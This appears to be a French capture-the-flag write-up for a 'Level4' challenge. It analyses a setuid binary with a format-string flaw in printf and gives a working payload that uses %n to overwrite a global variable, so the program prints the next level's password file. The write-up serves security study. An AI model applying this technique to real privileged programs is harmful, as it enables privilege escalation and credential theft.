# Level4 — Analyse technique

## Binaire

- ELF 32-bit i386, dynamically linked, setuid setgid level5.
- Imports : printf, fgets, **system**.
- Variable globale **m** @ 0x8049810.

## Fonctions

- **main** (0x80484a7) : appelle `n()`.
- **n** (0x8048457) : buffer 512 octets, `fgets(buffer, 0x200, stdin)`, puis **p(buffer)**.
- **p** (0x8048444) : **printf(argument)** → l’argument est notre buffer, donc **format string**.
- Après `p(buffer)`, lecture de **m** (0x8049810). Si **m == 0x1025544** (16930116) : **system("/bin/cat /home/user/level5/.pass")** (chaîne à 0x8048590). Sinon retour.

## Vulnérabilité

- **Format string** : l’entrée est passée à `p()` puis à `printf(buffer)`. On peut utiliser **%n** pour écrire en mémoire.
- Il faut écrire la valeur **0x1025544** (16930116) à l’adresse **0x8049810** (variable `m`).

## Exploit

- Adresse de `m` (4 octets) au début du buffer, puis **%16930112x** puis **%k$n**. L’index **k** est celui dont le dump (`%1$p` … `%12$p`) affiche **0x41414141** (pointeur sur le buffer) ; sur l’ISO officielle **k = 12**.
- Commande : `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`. Sortie ~16 Mo ; le mot de passe level5 à la fin.
- Une fois `m` écrit, le programme exécute **/bin/cat /home/user/level5/.pass** et affiche le mot de passe.

## Adresses utiles

| Élément | Valeur      |
|--------|-------------|
| m      | 0x08049810  |
| Valeur à écrire | 0x1025544 (16930116) |
| Commande system | /bin/cat /home/user/level5/.pass |
